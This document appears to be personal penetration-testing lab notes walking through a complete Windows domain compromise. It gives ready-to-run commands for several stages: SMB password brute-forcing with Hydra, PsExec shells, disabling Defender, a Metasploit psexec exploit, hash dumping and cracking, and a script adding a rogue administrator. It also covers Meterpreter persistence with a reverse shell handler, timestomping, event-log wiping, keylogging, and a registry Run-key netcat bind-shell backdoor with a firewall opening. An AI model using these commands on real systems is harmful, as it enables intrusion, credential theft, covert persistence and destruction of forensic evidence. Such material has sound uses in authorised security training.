# 1.0 HYDRA
---
![[hydra-logo.svg|250]]
After completing the enumeration stage of the penetration test, we would have obtained a comprehensive list of the administrators. Upon obtaining this list, we will proceed to extract the usernames and compile them into a .txt file.  
  
Please find below the complete list of administrators:~

Administrator
A.George
G.Walsh
B.Greene
M.Mills
P.Armstrong
Y.Burton
B.Rice

we have added them to a list called users.txt
![[Pasted image 20231111143527.png]]

Now that we have the list on names saved we open up the terminal and we run hydra

```bash
hydra -V -L users.txt -P /usr/share/wordlists/small.txt smb://192.168.10.1 -o passwords.txt
```

if you want to speed this up you can run this instead
```bash
hydra -L users.txt -P /usr/share/wordlists/small.txt -t 16 smb://192.168.10.1
```
>This is a parallel task, it will speed up the speed of the bruteforce attack, but may also trigger a lockout 
>>to avoid detection, it would be wise to create a script that has sleep intervals or add -t 4 somewhere in the command

###### 1.2 Hydra Command Breakdown
---------
**Command**:  **`hydra`** -L users.txt -P /usr/share/wordlists/small.txt -t 16 smb://192.168.10.1 -o cracked.txt


**Breakdown**:

- **`hydra`**: The main command for Hydra, a popular password cracking tool.
- **`-L users.txt`**: Specifies the list of usernames to try, where 'users.txt' contains one username per line.
- **`-P /usr/share/wordlists/small.txt`**: Points to the password list file, here 'small.txt' from '/usr/share/wordlists/'.
- **`-t 16`**: Sets the number of parallel connections (threads) to 16, affecting the attack's speed.
- **`smb://192.168.10.1`**: Targets the SMB (Server Message Block) service at the IP address 192.168.10.1.
- **`-o`**: this will save the output to a file in this case called 'cracked.txt'

**Usage**:
This command is used to perform a brute-force attack against an SMB service running on the IP address 192.168.10.1. It attempts to log in with each username from 'users.txt' and each password from 'small.txt', using 16 threads.



```bash
[445][smb] host: 192.168.10.1   login: A.George   password: ethylene
```
as you can see when the command has finished you will have gotten a password for one of the admins (if you are lucky)




# 2.0 REMOTELY ACCESSING A MACHINE
----
If successful, penetration testers at this stage would effectively demonstrate their access by executing straightforward actions, such as placing a text file on the desktop of the Administrators or the root of the C drive on a significant machine, such as a server.

This task can be accomplished by assigning a drive letter (e.g. Q) to a share. In this specific case, mapping a drive to the C drive on the server is recommended. It is worth noting that the C drive is automatically shared as c$ (the $ signifying that it is a hidden share).

> from the main windows desktop, open a command prompt (not as admin) and input the following

```powershell
net use q: \\192.168.10.1\c$
```

###### 2.2 Command Breakdown | Mapping Command
-------

**Command**  `net use q: \\192.168.10.1\c$`

**Description**  
- **Purpose**: Maps a network share to the local machine.
- **Command Structure**:
  - `net use`: Command to connect, remove, or configure connections to shared resources.
  - `q:`: Designated drive letter for the mapped network share.
  - `\\192.168.10.1\c$`: Path of the network share.
    - `192.168.10.1`: IP address of the host computer.
    - `c$`: Indicates the C drive of the host, accessed administratively.

**Usage Notes**  
- This command is widely used for accessing shared drives in a Windows network environment.
- It requires administrative access to the remote computer's C drive.
- Ideal for batch scripts and network management tasks.


we will then be prompted for the username and password

```powershell
Enter the user name for '192.168.10.1': A.George    Enter the password for 192.168.10.1: ethylene       The command completed successfully.
```

now when we open up explorer we will see a new drive under This PC

# 3.0 Running Programs remotely using Psexec
--------

![[DALL·E 2023-11-12 14.png|200]]

***PsTools*** were written by a company named "Sysinternals" and bought by Microsoft
these tools are used by hackers and network admins, PsTools is all used in the command line

***PsExec*** is a light weight telnet-replacement that lets you execute processes on other systems. it is filled with features 

Now lets run this command to gain access to this machine. 

first you need to open up **PowerShell**, in the same directory as **PsExec**. you can do this with the **cd** command. 

```PowerShell
# This will connect to the target and open up the command prompt
.\PsExec.exe \\192.168.10.1 -u A.George cmd

# This will open connect and open up PowerShell
.\PsExec.exe \\192.168.10.1 -u A.George powershell
```
> when you run this command, you will be prompted for a password, in this case its ethylene

```PowerShell
PS C:\Windows\system32> whoami
haiuadtargetnet\a.george
```
> as you can see we are login in as A.George who is an admin on the server

use other commands like **ipconfig** to see IP address information, if you are in **cmd** you will need to use **dir** to see what is in the folder if you are using **PowerShell** you can use **dir** and **ls** 


# 4.0 GETTING METERPRETER SHELL
---------

### 4.1 Metasploit 


From Kali Linux, run Metasploit by running this in the terminal

```bash
# starts metasploit framework
msfconsole

# Selecting the exploit
use exploit/windows/smb/psexec

# shows options
show options
```

>When we use show options this will be seen 

![[Pasted image 20231112164241.png]]
>we need to set it so that this payload is attacking the right target

enter the following to do this.
```bash
set SMBDomain uadtargetnet.com
set SMBPass ethylene
set SMBUser A.George
set RHOSTS 192.168.10.1
set LHOSTS 192.168.10.253

# To Run the script
exploit or run
```

![[Pasted image 20231112164800.png]]
> This is happening because of the anti-virus on the target, it is deleting the payload, and preventing it from running

### 4.3 Using PsExec to stop the Anti-Virus

To get around the the previous issue, one great way to get around the anti-virus deleting the payload is to use **PsExec** from a windows machine

from a windows machine run this command
> Open PowerShell and change directory to where the PsExec tool is 
>> Logon and password used in this case ***A.George*** / ***ethylene***

- Run the following
```powershell
# Go to Directory
cd \to\file\location

#run PsExec with cmd and powershell
.\PsExec.exe \\192.168.10.1 -u A.George powershell

# When prompted
Password: ethylene 

# To Disable Anti-Virus
C:\Windows\system32> Set-MpPreference -DisableRealtimeMonitoring $true
```


- Back in **msfconsole** run the exploit command again
![[Pasted image 20231112170412.png]]
>Meterpreter Shell
>> "im In"

# 5. DUMPING THE USER HASHES.
-------

To be able to dump the hashes, SYSTEM rights are required, despite being logged on with an Administrator, SYSTEM Rights are different from the Admins right. thankfully meterpreter will helps out with this.to get SYSTEM rights enter the following 

```bash
getsystem

hashdump
```
> sometimes the hashdump will not work, this is because meterpreter is running on server as administrator. to bypass this run the PS command to find a process that is running as SYSTEM.

```bash
ps
```

- Look for a service running under User as **SYSTEM**
![[Pasted image 20231112171625.png]]
> Their are a few running as system here.
> > 752 620 svchost.exe is a good choice


- now enter the following. 
```bash
meterpreter > migrate 752
```

Now try ***hashdump*** again, it should now dump the hashes, save the following into a notepad for further cracking
![[Pasted image 20231112172227.png]]

- Leave meterpreter running - as it will be used later
# 6.0 CRACKING PASSWORDS USING CAIN
------

Cain is a pretty old program, it has also been discontinued but despite its old age, its still pretty useful. 

install and open up cain on your PC, while install make sure to right click and properties the install, Run it through windows compatibility 

- Run Cain

- Select the cracker tab

- Right click in the centre windows and select add to list
![[Pasted image 20231112215116.png]]

- import the file from the hashdump

- highlight all the users

- Right-click and then select the following: - 
![[Pasted image 20231112215242.png]]

- Right-Click in the Dictionary windows and add another file cain.txt, ( can find this in the Tools folder)

![[Pasted image 20231112215417.png]]


- Hit start and the dictionary attack should run. 

> Note what CAIN is trying for each of the words in the dictionary text file.

![[Pasted image 20231112215545.png]]

This should crack some of the hashes 

![[Pasted image 20231112215600.png]]


## 6.1 Cracking Hashes with hashcat

Hashcats is a great password cracking tool. it is able to handle a lot of formats. if comes pre installed in kali Linux

![[Pasted image 20231112221228.png|600]]

**Hashcat Command**:

- The basic *Hashcat* command to crack *NTLM* hashes is:
    
    `hashcat -m 1000 -a 0 -o cracked.txt [path_to_hash_file] [path_to_wordlist]`
    
- Here, `-m 1000` specifies NTLM hash mode, `-a 0` specifies a dictionary attack, and `-o cracked.txt` is the output file for the cracked passwords.
- Replace `[path_to_hash_file]` with the path to your new hash file and `[path_to_wordlist]` with the path to your wordlist.

when we open up the text file **cracked.txt** it will show us all the  
![[Pasted image 20231112220624.png]]
> after running it through Hashcats its removed the usernames

thanks to modern Ai though, this can be rectified easily, after using Ai and asking it to rectify this problem by pasting both of them into something like **chatGPT**, we get the final list with the usernames and their passwords. 

- `26de073c22b6113b677d5ada4637cbd6`: `MYSQL3$` (password: `absent`)

#  7.0 METASPLOIT
-------
![[Pasted image 20231113235042.png|250]]

Meterpreter, is a highly advanced payload, it uses in-memory stagers and is extended over the network at runtime. It has large range of functionality, We will now examine it's basic use and also some of its post-exploitation command functionality 

- Go back to your meterpreter session. 

> *Note*: -
> 
> Often a meterpreter session can die or drop out, if this happen run exploit to get the session back. 


### 7.1 Help

The help command, will display all the different options we can run while we are in the shell 

- *help:* - 
![[Pasted image 20231112223954.png]]
> To get help with specific commands use the -h switch.

### 7.2 ipconfig

This command will show basic information about the network cards on the targeted hosts

![[Pasted image 20231112224221.png]]

### 7.3 SYSINFO

This command displays basic information about the compromised host:

```bash
meterpreter > sysinfo
Computer        : SERVER1
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : UADTARGETNET
Logged On Users : 4
Meterpreter     : x86/windows

```

### 7.4 Idletime

Running idletime will display the number of seconds that the user at the remote machine has been idle.

```bash
meterpreter > idletime
User has been idle for: 2 hours 30 mins 35 secs
```


### 7.5 Getuid
This is equivalent to the Linux whoami command. 

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### 7.6 PS

The PS command gives a lot of useful information about what is running on the server.
![[Pasted image 20231112225630.png]]
### 7.7 PWD,CD AND LS (EXPLORING THE FILE SYSTEM)

- **pwd**: - will allow the user to see the current directory they are in 
- **ls**: - will  show you what files are in the current directory, you can also point it to a specific directory. 
- **dir**: - same as ls
- **cd**: - moves to a directory

lets use the above commands to navigate to the root directory, so we can get a file listing of all the files in the **dir**.

When getting into the meterpreter shell, run **pwd** to see where we are. normally at first we will be in **C:\Windows\system32** from  here **cd .. ; cd ..** now **dir** or **ls** to list files

![[Pasted image 20231113022224.png]]

### 7.8 CAT Command

cat command is can be used to read the contents of a file like: - 

	cat setip.ps1

![[Pasted image 20231113022518.png]]


### 7.9 LPWD and LCD (Altering Local Folders)

We can download files from out shell but where will the files go on our local Operating System. 

this can be controlled by using the local *pwd* which shows our current directory in the **Kali Linux** machine. 

to move our local pwd we can also use lcd 

![[Pasted image 20231113023213.png]]
> changing the local directory with ***lcd*** and making sure we are in the right place with ***lpwd***

- local ls
>> Can also us lls to see the files in the local directory 


### 8.0 Download

Now that the local directory has been set to home/kali/Desktop

When I download a it will be saved on the Kali Linux desktop. to download something from the target, use the **download** command: - 

### 8.1 Upload

Since their is a download we are also able to upload local files to the current directory we are in on the target machine: -

![[Pasted image 20231113024249.png]]
> Uploading a file to the target

![[Pasted image 20231113024326.png]]
> Checking the file is in the currently directory

![[Pasted image 20231113024355.png]]
> Figure1 : Using cat to see the contents of hacked.txt

### 8.2 Edit

I am also able to edit certain files with the edit command

![[Pasted image 20231113024905.png]]
> Figure 2 | Editing hacked.txt

![[Pasted image 20231113024948.png]]
> Figure 4 | Editing file via VIM | can save with :qa 


### 8.3 Shell

This command allows us to enter the actual shell on the windows machine via Meterpreter. 

![[Pasted image 20231113025319.png]]
> Entering shell from meterpreter 
>> We know have the power of MS-DOS

### 8.4 Using PowerShell from a shell 

![[Pasted image 20231113025601.png]]
> Figure 5 | starting **PowerShell**
>> Since PowerShell is a structured programming language, we have a lot more power at our finger tips. 

[Hacking with PowerShell](https://ratiros01.medium.com/tryhackme-hacking-with-powershell-bf6dbc5febc9)

### 8.5 Uploading and Running PowerShell Scripts

Now I will create a very simple PowerShell script and run it on the compromised machine

make sure you are in the *meterpreter*.

I made a file called **getnic.ps1**

in the file is a **PowerShell** Command. 

```PowerShell
Get-NetAdapter -Name * -IncludeHidden
```

***PowerShell Script Breakdown***
`Get-NetAdapter -Name * -IncludeHidden`

`Get-NetAdapter`
- **Function**: Retrieves basic properties of network adapters.
- **Details**: Shows adapter name, interface description, status, MAC address, and speed.

`-Name *`
- **Parameter**: `-Name`
- **Function**: Specifies which network adapters to get.
- **Usage**: The use of `*` (asterisk) indicates a wildcard selection, meaning all network adapters are included.

`-IncludeHidden`
- **Parameter**: `-IncludeHidden`
- **Function**: Includes network adapters not visible in the Network Connections folder.
- **Usage**: Shows hidden adapters like those not in use, system devices, or virtual adapters.

This command is particularly useful for:
- Detailed network diagnostics.
- Configuration tasks in environments with virtual or hidden network devices.


We will now upload the file via the meterpreter 

![[Pasted image 20231113035249.png]]
> Figure 6 | uploading PowerShell script


Go back into shell from meterpreter to run the PowerShell script. shell | powershell

you can really have a lot of fun with this, you can even create a script that adds a user as administrator 

`ris:Windows`
```powershell
# PowerShell script to add a new administrator user on older versions of Windows

# Defining the username and password
$username = "00xNetrunner"
$password = "123456"

# Creating the new local user using net user
$createUser = net user $username $password /add
if ($LASTEXITCODE -eq 0) {
    Write-Host "User $username created successfully."
} else {
    Write-Host "Failed to create user $username."
    exit
}

# Adding the user to the Administrators group using net localgroup
$addToGroup = net localgroup Administrators $username /add
if ($LASTEXITCODE -eq 0) {
    Write-Host "User $username added to Administrators group successfully."
} else {
    Write-Host "Failed to add $username to Administrators group."
}

```

> Side note on WMIC: 
>> WMIC stands for Windows Management Instrumentation Command Line. When an Attacker gains a command on a Remote PC, then they can enumerate a huge amount of information and mae effective changes using the WMI Command Line, You may wish to have a breif look at it 

[WMIC Tutorial](https://www.hackingarticles.in/post-exploitation-using-wmic-system-command/)
[[WMIC Cheatsheet]]

### 8.6 enum_applications

In one of our first stages of hacking, we were enumerating each of the machines, like mapping out drives and finding admin accounts and passwords is user descriptions. 

Now lets get to it by running 
```bash
run post/windows/gather/enum_application
```

![[Pasted image 20231113174758.png]]
> Figure 7 | Installed Application on server1 : 192.168.10.1

### 8.7 enum_shares

As another example of the enumeration modules, enumerate the shares using the following command: - 

```bash
run post/windows/gather/enum_shares
```

![[Pasted image 20231113180202.png]]
> Figure 9  |  files currently being shared on the network. 


Thier is a ton of these post exploitation modules, lets have a look at them all

Run: 
```bash
run post/windows/gather/
```

then press TAB x2

### 8.7 Managing Sessions

During a **meterpreter** attack, you make have meterpreter sessions against different machines: - 

- The **background** command allows you to put your current session and set it to run in the background. 
- The **sessions** command on its own show the sessions you have running. 
- The **sessions -i** command will allows you to interact with any session number that you have. (see screenshot below)


#### 8.8 Creating a Persistent meterpreter shell

How to install a Auto-Reconnecting Persistent Back Door on Someone's PC

before you do this you will need a session, if you are in a session already just use the **background** command to run the session in the background. 

then run 
```bash
session
```

![[Pasted image 20231113220223.png]]
> Figure 10 | Active Sessions

**Now lets set up this backdoor: -**
```bash
# Set the current payload
use exploit/windows/local/persistence

# Shows options
show options

# Set the payloads options
set SESSION 1 
set LHOST 192.168.10.253
set LPORT 444
set INTERVAL 5

exploit
```

**Setting up the listener: -**
```bash
# Setting the module
use exploit/multi/handler

# setting the payload
set PAYLOAD windows/meterpreter/reverse_tcp

# Setting the local host : Kali Linux Machine
set LHOST 192.168.10.253

# Setting the Local Port
set LPORT 4444

# Run the exploit in the background.
# -j runs the shell in the background. 
# -z Tells metasploit not to interact with the shell
exploit -j -z 
```

![[Pasted image 20231113224052.png]]

From now on even if the PC reboots the session will be created. 

### 8.9 TIMESTOMP


**MACE** (modified, accessed, created, entry) values are file attributes that describe the dates and times of activity on a file. These attributes are used by administrators to determine when a file was last accessed or changed, and they can often be used to trace malicious activity.

Meterpreter allows us to alter these values so we can confuse any forensic investigation: - 

To get the current values: - 
```bash
timestomp setip.ps1 -v # if you are in the same dir as the ps1 file

timestop C:\\setip.ps1 -v # If you are not in the dir with the ps1 file but know where it is. 
```

![[Pasted image 20231115000138.png]]

To edit the Modified attributes: - 
```bash
timestomp setip.ps1 -m "02/14/2012 08:10:03"
```

![[Pasted image 20231115000437.png]]
> Figure 13 | Changed 'M' attributes

Reference: ~ [Link](https://ptestmethod.readthedocs.io/en/latest/MetasploitFundamentals.html)

### 9.0 CLEAREV

This command allows a pentester to clear his/her tracks be deleting the event logs under Windows, this will destroy a lot of forensic evidence. this should be the last command you use while pentesting a system/server

![[Pasted image 20231115001310.png]]

### 9.1 Grabbing Keystrokes

yet another great thing we can do with this program, lets set up a keylogger using Metasploit's meterpreter 

- create another meterpreter shell on Server 1
> Note in this scenario we are using the **administrator** account with the password **Thisisverysecret1**

- To capture the keystrokes, we will need to migrate to a process running as Administrator. From meterpreter shell run the following: - 
```bash
ps
```
![[Pasted image 20231115124724.png]]

- Lets use explorer.exe in this case. enter the following to migrate to the process: ~
```bash
migrate 1996
```

- Next start the keylogger
```bash
keyscan_start
```

- Now if you log into the target pc and open the notepad and typing whatever you would like. 
![[Pasted image 20231116002319.png]]
> for example I opened up the notepad and typed in random characters

- now lets go back to the kali linux machine and input the following: ~
```bash
keyscan_dump
```

- This command will dump what is stored in the keylogger
![[Pasted image 20231116002443.png]]
> As you can see this is everything we typed on the notepad on the victim PC, it even records the shortcuts

- To switch off your keylogger
```bash
keyscan_stop
```


For Reference - [Link](https://www.offensive-security.com/metasploit-unleashed/keylogging/)

### 9.2 Adding Persistence using registry ☄️

The Windows registry holds all the windows settings, With just a few keystrokes, you can cripple a system. 

> 💡 Note: Be careful when editing registry files when doing a pentest.

you can edit these registry files within meterpreter. 

One of the most useful registry key is *HKLM\\software\\microsoft\\windows\\currentversion\\run*.
This key indicates what to run when the machine first boots up. To give us a persistence backdoor we can set it so a netcat listener start at boot

- From meterpreter> prompt, show the key (i.e what runs at boot?) by running: ~
```bash
reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
```

> 💡 [[startup reg key command breakdown]] 💡

> ☄️Note:- As you can see, their are 3 programs that start along with the system.. 


- Now lets upload netcat from Kali Linux: - 
```bash
upload /usr/share/windows-resources/binaries/nc.exe C:\\windows\\system32
```

> 💡 [[Upload nc.exe command breakdown]] 💡

![[Pasted image 20231116021937.png]]
> 💡 Upload successful 

- Set Netcat to start at boot: ~
```bash
reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc
-d 'C:\windows\system32\nc.exe -Ldp 1000 -e cmd.exe'
```

- Run the first command again to see if NC was added. 
```bash
reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
```

- To enable this through the compromised machines firewall, run a remote shell and type: -
```bash
netsh firewall add portopening TCP 1000 "Service Firewall" ENABLE ALL
```

- Now that everything is set up, lets see if we can connect via netcat reverse shell
- Reboot the victims PC and allow it to start up again ( This may take a few minutes )
- Exit out of meterpreter and Metasploit framework 

- When the ever is rebooted run the following from a Kali Linux Terminal: - 
```bash
nc -v 192.168.10.1 1000
```
